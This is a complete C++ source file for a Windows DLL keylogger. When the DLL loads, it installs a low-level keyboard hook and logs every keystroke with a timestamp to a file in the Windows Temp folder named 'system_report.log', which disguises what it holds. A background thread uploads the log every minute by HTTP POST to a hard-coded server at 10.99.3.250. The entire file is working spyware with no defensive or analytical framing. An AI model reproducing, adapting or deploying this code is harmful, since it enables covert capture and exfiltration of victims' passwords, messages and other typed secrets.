#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <string>
#include <ctime>
#include <mutex>

#pragma comment(lib, "wininet.lib")

std::string LOG_FILE = "C:\\Windows\\Temp\\system_report.log";
std::string SERVER_URL = "http://10.99.3.250:8000";
std::mutex fileMutex;

void logKey(int keyCode) {
    std::lock_guard<std::mutex> lock(fileMutex);

    std::ofstream log(LOG_FILE, std::ios::app);
    if (!log) return;

    time_t now = time(0);
    tm* localtm = localtime(&now);
    char timeStr[20];
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", localtm);

    if ((keyCode >= 32 && keyCode <= 126)) {
        log << timeStr << " - " << static_cast<char>(keyCode) << "\n";
    } else {
        log << timeStr << " - [KEYCODE_" << keyCode << "]\n";
    }
}

LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        logKey(p->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void sendLogFile() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(60));

        std::lock_guard<std::mutex> lock(fileMutex);

        HINTERNET hSession = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hSession) continue;

        std::ifstream file(LOG_FILE, std::ios::binary);
        if (!file) {
            InternetCloseHandle(hSession);
            continue;
        }

        std::stringstream buffer;
        buffer << file.rdbuf();
        std::string fileContents = buffer.str();
        file.close();

        const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::stringstream data;
        data << "--" << boundary << "\r\n";
        data << "Content-Disposition: form-data; name=\"file\"; filename=\"system_report.log\"\r\n";
        data << "Content-Type: application/octet-stream\r\n\r\n";
        data << fileContents << "\r\n";
        data << "--" << boundary << "--\r\n";

        std::string body = data.str();

        std::stringstream headers;
        headers << "Content-Type: multipart/form-data; boundary=" << boundary << "\r\n";

        HINTERNET hConnect = InternetConnect(hSession, "10.99.3.250", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hSession);
            continue;
        }

        HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            continue;
        }

        BOOL sent = HttpSendRequest(hRequest, headers.str().c_str(), -1L, (LPVOID)body.c_str(), body.length());

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
    }
}

DWORD WINAPI startKeylogger(LPVOID) {
    SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);
    std::thread sender(sendLogFile);
    sender.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, startKeylogger, NULL, 0, NULL);
    }
    return TRUE;
}
